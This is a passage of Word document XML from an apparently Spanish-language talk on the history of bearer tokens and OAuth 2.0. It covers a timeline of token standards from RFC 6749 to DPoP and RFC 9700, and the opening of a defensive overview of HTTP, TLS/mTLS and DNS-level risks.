          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Por qué se abandonó el firmar-por-request:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> era </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>muy difícil de implementar bien</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (orden de</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  parámetros, canonicalización, relojes), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dependía de la criptografía en el cliente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, y era un</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>calvario para móviles y SPAs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, donde el secreto del cliente no se puede guardar. La comunidad pidió</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  algo más simple.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3.5 El giro (octubre de 2012): bearer sí, MAC no</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">OAuth 2.0 (RFC 6749) y el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>bearer token</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 6750) llegaron en octubre de 2012 con una consigna:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>simplicidad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. El token pasa a ser una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>credencial portadora</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> —"billete al portador"— que se pone</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">en la cabecera </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Bearer …</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y listo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">El propio OAuth 2.0 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">había definido además el tipo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>mac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (token con prueba de posesión), y hasta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">salió un borrador en febrero de 2012. Pero se </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>abandonó</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: exigía canonicalización, era difícil de</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>interoperar y el mundo prefirió la simplicidad. La consecuencia quedó escrita en la norma:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 6749, §10.3:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el servidor de recursos... </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>no puede</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> confirmar que el token fue emitido al</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cliente que lo presenta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Es decir: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>por diseño</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, quien tiene el token, lo usa. Esa es la frase que resume toda la charla.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3.6 La consolidación (2014–2025): ponerle cinturón al bearer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">La historia de los últimos diez años es la historia de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>atenuar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la propiedad portadora, sin perder la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>simplicidad: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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Año</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Aporte</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Qué agrega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2013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Revocación de tokens (RFC 7009)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cortar antes de la expiración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2014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OpenID Connect Core 1.0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identidad (ID token: quién y cómo) sobre OAuth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2015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JWT (RFC 7519) · PKCE (RFC 7636) · Introspección (RFC 7662)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claims; candado al código; validar tokens opacos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2018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Token Binding (RFC 8471-8473)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atar el token al canal TLS (sin adopción masiva)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2020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mTLS atado a certificado (RFC 8705) · JWT BCP (RFC 8725)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 xml:space="preserve">tokens </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>sender-constrained</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>; reglas de validación JWT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2021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Perfil JWT para access tokens (RFC 9068)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 xml:space="preserve">interoperabilidad;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exp</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> obligatorio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2023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DPoP (RFC 9449)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prueba de posesión por request, sin PKI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2025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RFC 9700 · NIST SP 800-63-4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mejores prácticas y sender-constrained/PKCE recomendados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3.7 Lo que enseña la historia (cinco moralejas)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Todo token portador es una contraseña portátil.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Si no está atado a su portador, quien lo roba</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   entra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>La simplicidad gana primero y cobra después.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> El </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>mac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se descartó por complejo; DPoP volvió a</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   traer la prueba de posesión 11 años más tarde.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cada capa de esta historia sigue viva.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Basic en clientes OAuth, SAML en empresas, API keys en</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   servicios internos, cookies en el navegador. No reemplazamos: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>apilamos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La vida del token importa más que su creación.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> La MFA protege la emisión; el daño ocurre durante</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   los días o meses en que el token vive.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>El token es una sola pieza.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> La mayoría de los incidentes no fueron "token roto", sino</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>autorización, validación, configuración o inventario</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. De eso trata la sección 6.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4. Los protocolos involucrados, de HTTP a DPoP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Esta sección es la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>caja de herramientas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de la charla. Para cada protocolo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>qué es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, **cuándo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>apareció</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cómo funciona a grandes rasgos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dónde aparece</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en la historia de los tokens y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>qué</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>falla</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> hay que mirar. No hace falta memorizar cada número de RFC; sí entender </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>qué problema resuelve</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cada pieza</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>en qué capa vive**.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278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protocol_sta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7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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Los protocolos involucrados, agrupados por capas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.1 Red y transporte</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HTTP/1.1, HTTP/2 y HTTP/3 (QUIC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el protocolo de aplicación de la web. Todo lo demás (OAuth, JWT, cookies) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>viaja dentro</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  de HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se usa acá:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> los tokens viajan en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cabeceras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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> o, mal, en la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>query string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. Las cabeceras son el lugar correcto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>request smuggling</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, desincronización entre proxy y backend, y el hecho de que la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>query string</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> termina en logs, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> e historial. RFC 9700 (2025) prohíbe el token en la URL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo: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1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Bearer eyJhbGciOiJSUzI1NiIs...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>TLS / SSL y mTLS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la capa que cifra y autentica el canal. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SSL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Netscape, mediados de los 90) fue el</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  origen; hoy hablamos de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>TLS 1.2/1.3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. HTTPS es HTTP dentro de TLS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se usa acá:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin HTTPS, el bearer token se lee al pasar. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>mTLS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (mutual TLS) hace que </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>ambas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  partes presenten certificado, lo que da </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>autenticación fuerte de cliente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y permite **atar el token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  al certificado** (RFC 8705).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> versiones viejas de TLS, certificados mal validados (el error de "ignorar la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  verificación"), terminación TLS que rompe la atadura del token, y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>pinning</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> mal hecho que rompe la app.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>DNS, TCP y QUIC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> DNS resuelve nombres; TCP transporta; QUIC (sobre UDP) sostiene HTTP/3.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dónde aparece:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (una API que resuelve una URL arbitraria controlada por el atacante),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>DNS rebinding</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y en la superficie de red de los gateways.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué mirar:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> APIs que aceptan una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin lista blanca; resolución interna que el atacante puede</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
